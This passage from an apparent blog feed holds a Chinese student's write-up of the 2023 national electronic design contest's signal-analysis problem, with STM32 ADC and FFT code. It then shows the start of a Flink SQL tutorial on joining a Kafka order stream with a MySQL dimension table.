      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/badboy02/p/19623709\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 14:06\">\n    <span>2023年电赛国赛经历</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"2023年电赛国赛经历\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3763221/202602/3763221-20260219000428689-1446099918.png\" />\n        2023年全国大学生电子设计竞赛经历，D题信号题，国赛二等奖。\n一些比赛经历和经验技巧\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>--- markdown描述<br />\ntitle: 电赛2023国赛D题比赛经历<br />\ndate: 2023/8/15 11:52:25<br />\ncover: true<br />\nmathjax: false<br />\nsummary: 比赛过程和一些准备工作的碎碎念<br />\ncategories: Note<br />\ntags:</p>\n<ul>\n<li>电赛</li>\n<li>信号</li>\n</ul>\n<hr />\n<h2 id=\"补档声明\">补档声明</h2>\n<p>由于我的博客服务器和备案到期，所以选择转移到博客园平台来进行保存和记录。以后也有可能会在上面不定期更新一些技术类博客。</p>\n<h2 id=\"写在前面\">写在前面</h2>\n<p>🪓突然意识到自己已经8个月没更新博客了，这段时间其实也没遇上啥太复杂的事，大概就是一些沉淀之类的，决定了之后的学业去向，推免了本校的研究生。进一步认识了一群未来志同道合的的同门，激情爽玩塞尔达旷野之息和王国之泪，狠狠地治愈了一阵子的电子阳痿，以及开始健身（存疑）。<br />\n当然，电赛什么的也是有在准备的，由于团队其他两个都是硬件佬，他们承受着画板与焊接调试的水深火热，我只需要安安静静的写代码就足够了（笑），每天实验室上下班，把自己的部分搞定，然后去健身房锻炼一会，回来美美加个餐洗个澡，然后打打机去睡觉，也算是某种意义上的平静的生活，求之不得。毕竟当初决定打电赛说到底也只是为了提升自己，探索一下电子世界的奥妙，这么久走过来也是重在坚持，也希望最后能有一个好结果。<br />\n截止到写博客的时候，我们组的成绩省赛以省一并列第一出线，综合测评应该也能过线，山东大学国测复测不出意外的话，应该是国二以上。</p>\n<p>这篇博客会分为上下两部分，上篇主要是比赛的过程和一些前置的准备(没有营养的碎碎念)，下篇主要是一些算法具体的实现(一些情急之下的灵机一动，大佬轻锤)。</p>\n<h2 id=\"比赛过程\">比赛过程</h2>\n<ol>\n<li>准备阶段</li>\n</ol>\n<p>我们队伍一直以来训练的是仪表和高频题，一开始侧重FPGA高速信号采集和数字域处理这一块，但是后面逐渐意识到，对于电赛的指标范围内好像也不需要这么高的频率，高载波带来的高采样率问题可以通过下混频缓解，而高频直采带来是的FIR滤波器的资源消耗成倍增加，以及数字域处理带来的资源占用和量化噪声问题。</p>\n<p><img alt=\"ZYNQ7100平台\" class=\"lazyload\" /><br />\n这是我们准备的ZYNQ7100的平台，可以外接高速ADDA，板载DDR3.<br />\n但是吧，ZYNQ平台的综合速度和固化难度以及Verilog代码的验证难度，在分秒必争的竞赛里，如果没有长期的训练和准备，在比赛那四天着急上头去写，恐怕会翻车。</p>\n<p>于是在训练后期又重回STM32H743的单片机平台，侧重模块叠加后的健壮性和代码的可复用性。</p>\n<p>从训练开始，🪓就有意识地把一些算法，尤其是FFT分析这一块，写成了独立的函数去进行一些参数的分析，然后把其他的像是屏幕显示，按键输入，外设驱动，都封装成主循环中的函数，用参数和标志位去控制。不得不说在电赛的信号分析题中还是一种很好用的代码架构。</p>\n<p><img alt=\"Main函数截图\" class=\"lazyload\" /></p>\n<p>本次代码的组织结构，可以清楚的看到，是首先进行ADC采集，FFT计算，然后将参数传入Judge_ModeType函数计算出调制类型，然后进入相应的部分去进行分析和显示。</p>\n<p>2.正式开始</p>\n<p>比赛的那几天，第一天上午8点队友一拿到题目基本上就确定了是D题，然后就开始画系统框图，找模块，搭系统。<br />\n🪓是九点钟到的实验室。然后一看题，哦豁，Ma和Mf！ 这不是老朋友吗，去年省赛这两位重量级，特别是Mf，让无数队伍刹羽而归。<br />\n其奇妙的多值和莫名其妙的算不准问题，难到了一大批电赛壬。<br />\n不过算法方面🪓早有应对，具体请看后文分析。<br />\n队友把混频模块弄好，确定好中频频率后，把混频后的信号通入ADC模块，此时🪓进行了简单的测试，确定了ADC采样率。<br />\n然后就开始了算法的编写。在第一天的中午就把Ma的计算搞定了，精度误差大概在0.05左右。<br />\n然后下午把Mf的算法也基本调试正确了，精度误差在0.2左右，有少量的多值问题，这时候时间已经是第一天晚上的8点，🪓进行了第一次备份。（时常备份真是好习惯）<br />\n<img alt=\"备份截图\" class=\"lazyload\" /><br />\n这是工程的几次备份图，可以看到从7月17日确定了基本平台之后，就是几天一备份，在比赛那几天更是一天备份几次。<br />\n为什么没有使用git之类的版本控制工具呢，因为我不会（其实是懒得建仓库+没找到合适的托管平台，github连不上，gitee不想用）<br />\n然后就是ASK，FSK，PSK的判别、解调以及FSK的h参数计算问题，总的说来，这个花费了🪓一番功夫，也算是最核心的代码部分。<br />\n第二天的中午完成了模拟调制和数字调制两大类的初步判断，下午进一步完成了模拟的AM，FM，CW的进一步判断，以及数字的ASK，FSK，PSK的进一步判断和解调。(充实的一天)<br />\n<img alt=\"PSK解调\" class=\"lazyload\" /><br />\n第二天晚上回寝室的时候🪓在和队友闲扯的时候突然想到了FSK的h参数计算方法，然后在小本本上记了下来。<br />\n第三天，🪓一到实验室就开始着手验证自己的想法，发现完全可以，直接芜湖起飞。<br />\n然后下午的时间就是加入射频开关和滤波器，放大器等原件，完成了系统的整体级联和最后解调波形的实时切换。<br />\n第三天的晚上其实整个系统已经级联并且测试好了。<br />\n最后一天就是一些锦上添花的功能，比如实时频谱显示和QPSK的判断以及高频载波下的解调以及准度的修正，在下午三点左右完成了最后的测试和封箱。<br />\n<img alt=\"封箱\" class=\"lazyload\" /><br />\n总的来说这几天的流程还是稳扎稳打，逐步推进的。我们团队一直以来配合的也很不错，效率贼高，最后呈现出来的效果就是电赛这三天每天晚上11点都回寝室睡觉了，第二天9点再到实验室，也还能完成所有的基础和提高指标并做出3项其他指标。不知不觉中完成了我们团队刚开始接触电赛的时的一个玩笑-希望以后能不熬夜就打完电赛。<br />\n<img alt=\"交作品\" class=\"lazyload\" /><br />\n作为东道主，半夜交作品也是很合理的罢。</p>\n<p>3.省赛测评</p>\n<p>封箱后的第二天就是省测了，总的来说还是蛮顺利的，所有功能都演示出来了，测评表的指标也没有很难的点。<br />\n测完直接和朋友出去快乐吃喝，等待综合测评名单。</p>\n<p>4.综合测评<br />\n由于🪓理论上是纯软件队员(其实🪓也会画板子和焊板子，这就是EEer的素养)，综合测评的硬件大业当然就交给我的两位大爹队友了，🪓只需要在旁边写个报告算个参数就好。<br />\n在准备硬件测评器件，我们测试了各种555电路，二极管检波，微分积分器，加法器，带通滤波器的电路图。<br />\n综合测评那天，一进现场，发现题目竟然是模拟计算器，用来解一个微分方程。<br />\n不过稍加分析，就会发现其本质是文氏桥正弦发生器，三角波发生器，两个积分器，一个微分器，一个加法器的组合。<br />\n这一里面的每一项单独拎出来都很简单，但是在当时时间比较紧促的情况下，我们虽然把电路全部级联出来了，但是在零状态的时候，并没有像计算的那样，产生一个33Hz的自激波形。<br />\n也许是中间的某项RC常数没有配置正确，也许是某一段未修正相差，也许是某一段的偏置需要消除，总是零状态的时候就是妹有出波形。<br />\n说到模拟计算电路，其实这是个展开来讲有非常多可以讲的话题，想进一步研究的同学可以移步CNPP大佬的模拟计算 <a href=\"https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details\" rel=\"noopener nofollow\" target=\"_blank\">https://hackaday.io/project/191142-analog-lorenz-attractor-computer/details</a><br />\n我们也就停止了后面的输入激励。静待比赛时间结束，毕竟这只是一个达标测试，就不冒进去做进一步的冒险了。</p>\n<p>有一说一中午学校提供的饭菜还可以，菜品有土豆烧牛肉，木耳炒蛋，水煮虾，还有酸奶和水果，我TM吃吃吃。</p>\n<p>4.国赛评测</p>\n<p>等🪓玩回来更新</p>\n<h2 id=\"题目分析\">题目分析</h2>\n<p><img alt=\"题目描述1\" class=\"lazyload\" /></p>\n<p><img alt=\"题目描述2\" class=\"lazyload\" /></p>\n<p><strong>题目分析（*的数量为重要程度）</strong></p>\n<ul>\n<li>题目的输入信号有100mv，属于一个比较大的信号，从信号源直出，通过SMA线输入，<strong>信噪比非常高，不需要考虑信号在无线传输过程中被干扰和多径效应等问题</strong></li>\n<li>载波频率2MHz，说实话，是一个比较微妙的频率，刚好超过了市面上单片机内置ADC的最大采样频率，但是对于FPGA外挂的50M左右的高速ADC来说(AD9225:没错正是在下)，又看上去是一个很合适的频率。所以使用单片机的组一般会<strong>选择下混频</strong>，而使用FPGA的组如果选择直采，经过我们当时的分析，可能会遇到一些问题问题，比如FFT后频率分辨率不够，FIR资源消耗大带来的综合慢，数字下混频相位不对齐造成的失真和误差(更别提Vivado的FFT的IP核要想用好其实并不容易，定点FFT很容易产生很大的舍入误差)。肯定有FPGA佬能想到规避或者解决的办法。但是受限与我们当时知识理解的程度，我们还是选择了单片机平台。所以从这也可以看出电赛的出题并不一味地要求好的器件，而更多的是<strong>因地制宜选择方案</strong></li>\n<li><strong>要计算调幅度Ma，这就要求获得调制后信号的频谱，也就是要做FFT</strong>。这就要求ADC的采样频率能够高于中心频点+最大频偏之和的两倍。当然，实际上为了频谱的可读性和频率精确度的考量，一般选择4至6倍的采样频率*</li>\n<li>要计算调频度Mf和最大频偏Δf，同上，还涉及到一些算法的<strong>多值问题</strong>，在后面详细讨论</li>\n<li>要进行模拟调制的解调，可以先通过混频**把信号混到10.7M高中频，使用ADL5511 ，NE564等芯片进行解调</li>\n<li>要识别ASK，FSK，PSK等调制方式，这就要求<strong>把它们的频谱差异提取出来并做好特征区分，以及对于某些非常相似情况下引入多重判断维度来进行区分</strong> 。</li>\n<li>要通过频谱进行FSK的h参数的计算，其实在单片机里做是很难的，但是我们可以<strong>通过FM和FSK的相似性，来进行一些取巧的操作</strong>，这个后面详细讨论**</li>\n<li>要识别待调制波的频率，其实就是<strong>计算调制后波形的FFT相邻频点之间的间隔</strong>，这一点是由调制的性质所导致的，所有调制方式都能通过这种方式判断待调制波的频率*</li>\n<li>要进行数字调制波形的解调，<strong>要结合不同调制方式的特点，混合使用模拟模块和数字域判决的方式来进行解调</strong>，比如ASK使用的是先通过模拟AD8310检波后通过直流量高低来判断0，1波形。FSK使用了数字FIR把频率转变为包络的变化，进行0，1的判决。而PSK使用了先数字域下混频和FIR的方式，把相位的跳变导致的相乘后的包络变化通过滤波器检出</li>\n<li>要综合上述的识别和计算，通<strong>过模拟开关将解调结果通过一个通道显示</strong>在示波器上，并通过AGC等手段，保证电压大于1Vpp*</li>\n</ul>\n<h2 id=\"系统架构\">系统架构</h2>\n<p><img alt=\"系统架构\" class=\"lazyload\" /></p>\n<p>本系统硬件框图如图所示，乍一看非常复杂(实际上也确实很复杂，最后数了一下，作品上一共有26块板子)。别急，让我们慢慢来，一步步分析，<br />\n由于输入信号的峰峰值是100mV，换算一下也就是-16dbm，所以首先经过24dB增益的低噪放ERA-3SM进行放大。<br />\n此时的信号幅度有8dbm，也就是峰峰值1.5Vpp，正好适合后面的各种器件的电压范围。<br />\n然后将信号通过功分器，同时混频到50kHz中频和10.7MHz中频。这是为了一路用来分析，一路用来模拟解调。<br />\n50kHz 的中频信号，经过滤波、放大和电平搬移后，一路经过ADS8688变为数字信号送入单片机。另一路经过检波器 AD8310 和滤波器 UAF42 后检出 ASK 的直流，并送给单片机进一步完成 ASK 信号的定时抽判。<br />\n10.7MHz 的中频信号经过陶瓷滤波器、放大器和射频开关后，分别进行基于 ADL5511 的 AM 包络检波解调和基于 NE564 的FM 解调.<br />\n最后通过 MCU 控制的模拟开关TMUX1109，将解调结果送给示波器显示。在单片机内，通过对 50kHz 的中频信号的频谱分析，得到调制信号类型和调制参数，<br />\n以及FSK和PSK的解调结果的输出，并控制其他模块完成最后结果的汇总输出，以及控制液晶屏显示识别结果和参数。</p>\n<h2 id=\"一些准备工作和小寄巧\">一些准备工作和小寄巧</h2>\n<h3 id=\"电压和dbm的换算\">电压和dbm的换算</h3>\n<p>在射频电路中，为了表示比较小的电压，一般采用对数形式，其中dbm是一个常用的单位，它是在某一阻抗匹配系统下，功率相对于1mW的比值，而由于已经射频电路阻抗一般是50欧姆，所以相当于也知道了电压。<br />\n不过由于功率的计算还涉及到波形的有效值啥的，方波1，正弦0.707，三角波0.57，实际中一般不会自己去算，都是使用这种在线计算器。<br />\n可以记忆一下一些常见的值</p>\n<table>\n<thead>\n<tr>\n<th>正弦波</th>\n<th>50欧姆阻抗下</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-116dbm</td>\n<td>1uVpp</td>\n</tr>\n<tr>\n<td>-56dbm</td>\n<td>1mVpp</td>\n</tr>\n<tr>\n<td>-36dbm</td>\n<td>10mVpp</td>\n</tr>\n<tr>\n<td>-16dbm</td>\n<td>100mVpp</td>\n</tr>\n<tr>\n<td>0dbm</td>\n<td>632mVpp</td>\n</tr>\n<tr>\n<td>4dbm</td>\n<td>1Vpp</td>\n</tr>\n<tr>\n<td>14dbm</td>\n<td>3.3Vpp</td>\n</tr>\n</tbody>\n</table>\n<p>实用小工具 电压和dbm的换算<br />\n<a href=\"https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html\" rel=\"noopener nofollow\" target=\"_blank\">https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html</a></p>\n<p><img alt=\"ADI电压换算工具\" class=\"lazyload\" /><br />\n注意这里的VPeak是峰值，换算成峰峰值的话要乘以2</p>\n<h3 id=\"adc的一些准备工作\">ADC的一些准备工作</h3>\n<p><img alt=\"ADS8688手册\" class=\"lazyload\" /></p>\n<h4 id=\"adc选型\">ADC选型</h4>\n<p>我们本次使用的是ADS8688A作为系统的ADC，它是一个16bit，500KSPS采样率的SAR型ADC。<br />\n它的特点有双极性输入，可配置动态范围，内部基准，八通道MUX采样，误差和漂移都很低，对于本题来说肯定是够用的。<br />\n我们用它主要还是看上了它支持双极性输入和可变动态范围这一点，这样就不用自己做前级的搬移和放大。<br />\n而且自带过压保护，比较耐造。<br />\nPS.我们的STM32H743平台的内置ADC，在某次测试的时候，对单频大幅值信号采样做FFT后，其二次谐波值会大的超出常理，理论上来说是不会有这么大的。<br />\n怀疑内置SAR积分电路被过压橄榄了😓<br />\n所以换用了这个外置的ADC，以后可以开一篇文章讲一下ADC的各种参数，以及这种失真是怎么来的，此时就要请出另一位小信号领域的expert，FloydFish🐟<br />\n可以移步<a href=\"https://www.emoe.xyz/opamp-noise-analyze/\" rel=\"noopener nofollow\" target=\"_blank\">https://www.emoe.xyz/opamp-noise-analyze/</a> ，以及相关的小信号测量。</p>\n<p>驱动代码<br />\n这个的驱动我已经打包好了，下载下来改一下管脚直接用就可以了 <a href=\"https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip\" rel=\"noopener nofollow\" target=\"_blank\">https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip</a><br />\n<strong>ADC的驱动要注意的两点是，一是这个ADC的数据Latch和吐出是根据SPI的速率来的</strong><br />\n所以为了控制采样速率，需要自己控制其中的IO操作后的Delay函数，经过测试，在ARMCC6编译器，O2水平的优化下，使用volatile参数，下面这种delay方法依然可以达到延时效果。</p>\n<p><img alt=\"Delay的实现\" class=\"lazyload\" /></p>\n<p><img alt=\"ADS8688的采样函数\" class=\"lazyload\" /><br />\n二是采样的时候需要关闭中断响应，因为我们不希望采样的时候定时器中断什么的把采样操作打扰了。</p>\n<p>这里的采样率根据实测大概在250K左右，达不到官方的标称的500K。应该是已经达到了软件SPI的IO速度上限了，250kSPS*16bit = 4Mbit的速度了。</p>\n<p>如果要更快一点，可以使用硬件SPI+DMA的方式，但是比赛当前，就不折腾花活了，能用就好。</p>\n<p>另外一点是STM32的H7系列的软SPI的会有的一个毛病，在CubeMX中需要把这些个管脚(CLK,MISO,MOSI,CS)的最大频率设置成Low，否则如果设置为High之类的。</p>\n<p>较大的驱动电流会造成信号的过冲和振铃，造成读出的数据有时是对的，有时读出的会是全1或者全0。</p>\n<p>这一点我是在调试RDA5820的时候发现的，之前用STM32U5驱动RDA5820是正常的，同样的代码在H7下就会有时正确有时不能读出。后来在思考信号完整性链路的时候有了新的想法。</p>\n<p>我个人的看法是，可能由于是H7的驱动电流能力比较强，IO翻转的上升沿相比F1，F7这些要陡峭很多，而数字信号链路是通过一段比较长的XH2.54线接到了外部的模块上，<br />\n根据传输线模型的推论，当传输线长度和1/6上升沿波长可以相比拟时，就有可能造成信号完整性问题。<br />\n所以这时IO驱出来的数字波形会有过冲和振铃等信号完整性问题也是可以理解的。</p>\n<p>验证ADC采集时候，一般会串口打印波形，再使用SerialPlot查看，是不是和理论符合，比如下图就是ASK波形的采样结果。</p>\n<p><img alt=\"ASK的采集到的波形\" class=\"lazyload\" /></p>\n<h3 id=\"fft的准备工作\">FFT的准备工作</h3>\n<ul>\n<li>使用Cmsis DSP库，在Keil的包管理里面勾选即可，最新版本有窗函数的需要从官网上下载（怎么感觉有点似曾相识，我去年暑假好像也写过）</li>\n</ul>\n<p><img alt=\"Keil添加Pack\" class=\"lazyload\" /></p>\n<ul>\n<li>\n<p>在Keil的设置里面，加入ARM_MATH_CM7, ARM_MATH_LOOPUNROLL这两条宏定义，前面是Cortex版本，需要是MCU的内核版本，可以是CM1，CM4，CM7,后面的是控制数学舍入的，一般来说不用动。<br />\n<img alt=\"keil的编译设置\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>然后在include的地方加入 #include \"arm_math.h\"   和  #include \"arm_const_structs.h\"，然后开辟一个fft的全局数组，就可以愉快的调用啦。</p>\n</li>\n<li>\n<p><strong>FFT的调用</strong>**</p>\n</li>\n</ul>\n<pre><code class=\"language-C\">/* ADC采样并做FFT 结果放在全局数组fft_outputbuf中 */\n/* 做FFT 结果放在全局数组fft_outputbuf中 一次4096个点 */\nvoid FFT(unsigned short *ADC_Buffer, unsigned int SampleRate, unsigned int len, int debug, int serialplot)\n{\n    for(int i=0;i&lt;Sampling_CNT;i++)\n    Global_ADC_Value[i] = ADC_Buffer[i]*3.3/4096;   // 将采样结果转化到0-3.3V\n    \n    for(int i=0;i &lt; FFT_LENGTH;i++)   \n    {\n    fft_inputbuf[i*2] = Global_ADC_Value[i];  // 按手册要求的实部虚部交替的方法填充数组\n    fft_inputbuf[2*i +1] = 0;\n    }\n\n    arm_cfft_f32(&amp;arm_cfft_sR_f32_len4096,fft_inputbuf,0,1); // 执行FFT变换，arm_cfft_sR_f32_len4096为宏，定义旋转因子\n    arm_cmplx_mag_f32(fft_inputbuf,fft_outputbuf,FFT_LENGTH);    // 把运算结果复数求模得幅值\n\n    /* Debug打印区 */\n    \n    if(debug == 1)\n     for(int i=0;i &lt; FFT_LENGTH/2;i++)       // 是否打印FFT每个频点的幅值信息\n       printf(\"%d  %.3lf KHz Mag %.3f\\n\", i,SampleRate*1.0/len*i, fft_outputbuf[i] );\n    \n    if(serialplot == 1)\n     for(int i=0;i &lt; FFT_LENGTH;i++)       //  是否打印fft结果到到SerialPlot\n        printf(\"%.3f\\n\", fft_outputbuf[i]);\n\n}\n</code></pre>\n<p>做完FFT后，我们一般会通过SerialPlot软件来查看FFT的结果和和理论估计是否符合。<br />\n下图是1KHz载波，3KHz频偏的FM频谱的实测图<br />\n<img alt=\"FM的频谱\" class=\"lazyload\" /></p>\n<h3 id=\"代码组织的思路\">代码组织的思路</h3>\n<p>这题是一个经典的测量-分析-显示的题目，所以采用的思路就是先采集，判断调制类型后，进一步去对应的部分进行进一步的分析和显示。<br />\n由于FFT分析后给的参数值不止一个，所以使用了函数传地址的办法。<br />\n<img alt=\"函数传参参数\" class=\"lazyload\" /><br />\n而且由于Keil没有比较方便的代码补全和快捷提示功能，如果所有的算法都在main中实现，会导致代码实现那一段到下面的main函数的里调用段，有一段非常长的距离，所以我个人的建议是把一些更基础的算法代码另外封装到一个Algorithm文件里。<br />\n<img alt=\"Algorithm.c截图\" class=\"lazyload\" /></p>\n<h3 id=\"下节预告鸽了实际上因为神秘赛制的原因我们没有去到比赛现场但是还是国赛二等奖就不献丑了\">下节预告（鸽了，实际上因为神秘赛制的原因，我们没有去到比赛现场，但是还是国赛二等奖，就不献丑了）</h3>\n<ul>\n<li>模拟调制和数字调制两个大类的区分(中心载频与相邻频点之间的距离)</li>\n<li>三种模拟调制的区分(CW, AM, FM)</li>\n<li>三种数字调制的区分(ASK, FSK, PSK)</li>\n<li>各种调制载波频率的计算(频谱最近相邻谱线的距离)</li>\n<li>AM调制的Ma的计算(寻峰算法)</li>\n<li>FM调制的Mf的计算(基于模式匹配的思想)</li>\n<li>FSK调制的h参数的计算(基于和FM的相似带来的模式复用)</li>\n<li>ASK的抽判(基于直流量的定时抽判)</li>\n<li>FSK的抽判(两路FIR后的抽判)</li>\n<li>PSK的抽判(满足特定频率的相位突变点抽判法)</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 14:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/badboy02\">Badboy02</a>&nbsp;\n阅读(<span id=\"post_view_count\">3</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "从零开始学Flink：实时数仓与维表时态Join实战",
      "link": "https://www.cnblogs.com/daimajiangxin/p/19624638",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/daimajiangxin/p/19624638\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 12:58\">\n    <span>从零开始学Flink：实时数仓与维表时态Join实战</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"从零开始学Flink：实时数仓与维表时态Join实战\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260219125729266-340455730.png\" />\n        以电商订单实时数仓为例，演示如何在 Flink SQL 中通过维表时态 Join 将事实流与维度数据关联，构建带用户属性的明细宽表，并结合 Kafka 与 MySQL 环境完成一套可落地的实时数仓入门实践。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在前一篇 <a href=\"https://mp.weixin.qq.com/s/kLxoo6mHi49HvrrmaOdTsA\" rel=\"noopener nofollow\" target=\"_blank\">《Flink 双流 JOIN 实战详解》</a> 中，我们用「订单流 + 支付流」搞懂了事实双流之间的时间关联。</p>\n<p>但在真实的实时数仓项目里，光有事实流还不够，业务同学更关心的是：</p>\n<ul>\n<li>下单用户是新客还是老客</li>\n<li>用户当前的等级、城市、渠道</li>\n<li>商品所属品类、类目层级</li>\n</ul>\n<p>这些信息通常存放在 <strong>维度表</strong>（维表）中，例如 MySQL 的 <code>dim_user</code>、<code>dim_product</code> 等。我们希望在实时计算时，能把「事实流」和「维表」在时间维度上正确地关联起来，构建一张带有完整业务属性的<strong>明细宽表</strong>。</p>\n<p>这就是 <strong>维表时态 Join（Temporal Table Join）</strong> 要解决的问题。</p>\n<p>本文我们就以「订单事实流 + 用户维表」为例，完成一个从 Kafka 到 MySQL 的简易实时数仓 Demo，并重点理解 Flink SQL 中维表时态 Join 的语法和注意事项。</p>\n<h2 id=\"一业务场景与数仓目标\">一、业务场景与数仓目标</h2>\n<p>设想一个简化的电商业务场景：</p>\n<ul>\n<li>Kafka 中有实时写入的 <code>orders</code> 订单事实流</li>\n<li>MySQL 中维护一张 <code>dim_user</code> 用户维表，包含用户等级、所属城市、注册渠道等信息</li>\n</ul>\n<p>我们想要在 Flink 中构建一张「<strong>订单明细宽表</strong>」，字段大致包括：</p>\n<ul>\n<li>订单信息：订单号、下单用户、下单金额、下单时间</li>\n<li>用户属性：用户昵称、等级、城市、注册渠道</li>\n</ul>\n<p>并且要求：</p>\n<ul>\n<li>当我们回看 10 分钟前的某条订单时，看到的是 <strong>当时</strong> 用户的等级和城市，而不是被后续变更“冲掉”的最新值</li>\n</ul>\n<p>这正是 <strong>时态 Join</strong> 和「实时数仓」的关键：<strong>按事件发生时刻回放维度视图</strong>。</p>\n<h2 id=\"二环境前提与依赖准备\">二、环境前提与依赖准备</h2>\n<h3 id=\"1-基础组件\">1. 基础组件</h3>\n<p>本篇默认你已经完成前几篇中的环境准备：</p>\n<ul>\n<li>Flink 1.20.1（WSL2 Ubuntu 下部署）</li>\n<li>Kafka 集群已启动，且能正常写入 / 读取 Topic</li>\n<li>Flink SQL Client 可以正常连接集群</li>\n</ul>\n<p>在此基础上，我们还需要：</p>\n<ul>\n<li>一套可访问的 MySQL（本地或远程均可）</li>\n<li>Flink 的 JDBC Connector JAR 包</li>\n</ul>\n<h3 id=\"2-安装-flink-jdbc-connector\">2. 安装 Flink JDBC Connector</h3>\n<p>和 Kafka 一样，JDBC 连接器也需要以 JAR 包形式放到 Flink 的 <code>lib</code> 目录中。</p>\n<p>以 Flink 1.20.x 对应的 <code>flink-connector-jdbc</code> 为例：</p>\n<ol>\n<li>\n<p>确认 Flink 安装目录（假设为 <code>/opt/flink</code>）：</p>\n<pre><code class=\"language-bash\">export FLINK_HOME=/opt/flink\n</code></pre>\n</li>\n<li>\n<p>下载 JDBC Connector JAR 到 Flink 的 <code>lib</code> 目录：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME/lib\nwget https://repo1.maven.org/maven2/org/apache/flink/flink-connector-jdbc/3.3.0-1.20/flink-connector-jdbc-3.3.0-1.20.jar\n</code></pre>\n</li>\n<li>\n<p>如果你使用的是独立集群或远程集群，需要重启 Flink 集群，让新 JAR 在 JobManager/TaskManager 上生效：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/stop-cluster.sh\nbin/start-cluster.sh\n</code></pre>\n</li>\n<li>\n<p>重启 Flink SQL Client，使用新 Connector：</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/sql-client.sh\n</code></pre>\n</li>\n</ol>\n<p>如果你在 Windows + WSL2 上部署，只需在 WSL2 内执行上述命令即可；或者手动下载 JAR 后拷贝到 <code>lib</code> 目录，步骤完全一致。</p>\n<h2 id=\"三准备-mysql-用户维度表-dim_user\">三、准备 MySQL 用户维度表 dim_user</h2>\n<p>首先在 MySQL 中准备一张简单的用户维度表，用来存用户的基础属性。</p>\n<p>在 MySQL 中执行：</p>\n<pre><code class=\"language-sql\">CREATE DATABASE IF NOT EXISTS realtime_dwh;\nUSE realtime_dwh;\n\nCREATE TABLE dim_user (\n  user_id      VARCHAR(32)  PRIMARY KEY,\n  user_name    VARCHAR(64),\n  user_level   VARCHAR(16),\n  city         VARCHAR(64),\n  register_time DATETIME\n);\n\nINSERT INTO dim_user (user_id, user_name, user_level, city, register_time) VALUES\n('u_1', '张三', 'VIP1', '北京', '2025-12-01 10:00:00'),\n('u_2', '李四', 'VIP2', '上海', '2025-12-05 11:00:00'),\n('u_3', '王五', 'VIP1', '广州', '2025-12-10 12:00:00');\n</code></pre>\n<p>为了演示「时态」效果，你可以在后续实验中手动更新某个用户的等级或城市，例如：</p>\n<pre><code class=\"language-sql\">UPDATE dim_user\nSET user_level = 'VIP3'\nWHERE user_id = 'u_2';\n</code></pre>\n<p>这样我们在 Flink 里做时态 Join 时，就能观察“变更前后”的区别。</p>\n<h2 id=\"四在-flink-中注册事实流与维表\">四、在 Flink 中注册事实流与维表</h2>\n<p>接下来回到 Flink SQL Client，把 Kafka 中的订单事实流和 MySQL 中的维表都注册成 Flink 表。</p>\n<h3 id=\"1-kafka-订单事实表-orders\">1. Kafka 订单事实表 orders</h3>\n<p>和上一篇双流 JOIN 类似，我们假设 Kafka 中有一个 <code>orders</code> Topic，写入订单事实数据。</p>\n<p>在 Flink SQL Client 中执行：</p>\n<pre><code class=\"language-sql\">CREATE TABLE orders (\n  order_id     STRING,\n  user_id      STRING,\n  order_amount DECIMAL(10, 2),\n  order_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND,\n  proc_time AS PROCTIME()\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'orders',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-orders-dim',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n</code></pre>\n<p>你可以沿用上一篇中 Kafka 造数的方式，用 <code>kafka-console-producer.sh</code> 发送 JSON 订单数据，只需要保证字段名一致。</p>\n<h3 id=\"2-mysql-用户维表-dim_userjdbc-lookup-表\">2. MySQL 用户维表 dim_user（JDBC Lookup 表）</h3>\n<p>然后把刚才在 MySQL 中建好的 <code>dim_user</code> 注册为 Flink 的 JDBC 表：</p>\n<pre><code class=\"language-sql\">CREATE TABLE dim_user (\n  user_id       STRING,\n  user_name     STRING,\n  user_level    STRING,\n  city          STRING,\n  register_time TIMESTAMP(3),\n  PRIMARY KEY (user_id) NOT ENFORCED\n) WITH (\n  'connector' = 'jdbc',\n  'url' = 'jdbc:mysql://127.0.0.1:3306/realtime_dwh',\n  'table-name' = 'dim_user',\n  'driver' = 'com.mysql.cj.jdbc.Driver',\n  'username' = 'root',\n  'password' = '1qaz@WSX'\n);\n</code></pre>\n<p>注意几点：</p>\n<ul>\n<li><code>PRIMARY KEY (user_id) NOT ENFORCED</code> 告诉 Flink 